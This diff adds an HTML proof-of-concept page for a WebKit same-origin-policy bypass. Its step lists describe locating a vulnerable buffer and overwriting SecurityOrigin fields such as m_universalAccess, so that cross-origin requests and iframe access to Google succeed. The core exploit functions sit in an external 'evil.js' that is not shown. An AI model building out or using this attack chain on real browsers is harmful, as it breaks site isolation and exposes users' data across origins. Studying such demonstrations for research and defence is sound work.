@@ -1,0 +1,73 @@
+
+<html>
+<script src="evil.js"></script>
+<script>
+function loadXMLDoc()
+{
+	var xmlhttp;
+	if (window.XMLHttpRequest)
+	{// code for IE7+, Firefox, Chrome, Opera, Safari
+		xmlhttp=new XMLHttpRequest();
+	}
+	else
+	{// code for IE6, IE5
+		xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
+	}
+	xmlhttp.onreadystatechange=function()
+	{
+		if (xmlhttp.readyState==4 &&
+			xmlhttp.status==200)
+		{
+			document.getElementById("myDiv").innerHTML=xmlhttp.responseText;
+		}
+	}
+	xmlhttp.open("GET","https://google.com",true);
+	xmlhttp.send();
+}
+function access()
+{
+	var x = document.getElementById("drive");
+	var y = (x.contentWindow || x.contentDocument);
+	if (y.document)y = y.document;
+	y.body.style.backgroundColor = "yellow";
+}
+function setting()
+{
+	document.getElementById("drive").src="https://www.google.com";
+}
+</script>
+<body>
+
+<h2>AJAX</h2>
+The First Attack: </br>
+1. Click "Request data", no result as the xhr reqest is not allowed; </br>
+2. Click "Locate the buffer" to find the vulnerable buffer address; </br>
+3. Click "Find obj and change it" to locate WebCore::SecurityOrigin </br>
+&nbsp&nbsp&nbsp object and set the m_universalAccess to non-zero; </br>
+4. Click "Request data" again, should get the Google page; </br> 
+5. Click "Access Window", the window background is changed to yellow. </br>
+</br>
+
+<button type="button" onclick="loadXMLDoc()">Request data</button>
+<button type="button" onclick="exploit()">Locate the buffer</button>
+<button type="button" onclick="search()">Find obj and change it</button>
+<button type="button" onclick="access()">Access Window</button>
+</br></br>
+
+
+The Second Attack: </br> 
+1. Click "Set Google", no result; </br>
+2. Click "Locate the buffer" to find the vulnerable buffer address; </br>
+3. Click "Exploit host_port_protocoal" to change origin; </br>
+4. Click "Set Google" again to get google in the window. </br>
+</br>
+
+<button type="button" onclick="search_origin()">Exploit host_port_protocol</button>
+<p id="log"></p>
+<div id="myDiv"></div>
+<button onclick="setting()">Set Google</button>
+<br>
+<iframe id="drive" src='https://www.google.com'></iframe>
+</body>
+</html>
+
